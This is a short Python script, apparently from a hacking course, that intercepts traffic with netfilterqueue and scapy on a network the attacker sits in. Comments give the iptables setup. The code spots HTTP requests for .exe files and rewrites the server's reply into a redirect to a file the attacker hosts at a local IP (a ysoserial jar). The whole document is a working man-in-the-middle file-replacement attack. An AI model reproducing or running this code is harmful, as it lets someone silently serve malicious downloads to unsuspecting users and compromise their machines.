#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0 (TRAPPING REQUESTS IN A QUEUE)
# iptables --flush (TO DELETE ALL THE IPTABLES *MAKE SURE TO DO THIS)
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 (REDIRECTING PACKETS TO THE QUEUE)
# iptables -I INPUT -j NFQUEUE --queue-num 0


import netfilterqueue as netq
import scapy.all as scapy


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load and "192.168.200.136" not in scapy_packet[scapy.Raw].load:
                print("[+] EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # WE CAN GIVE THE URL WHAT WE WANT
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.200.136/ysoserial-all.jar\n\n")

                packet.set_payload(str(modified_packet))


    packet.accept()


queue = netq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
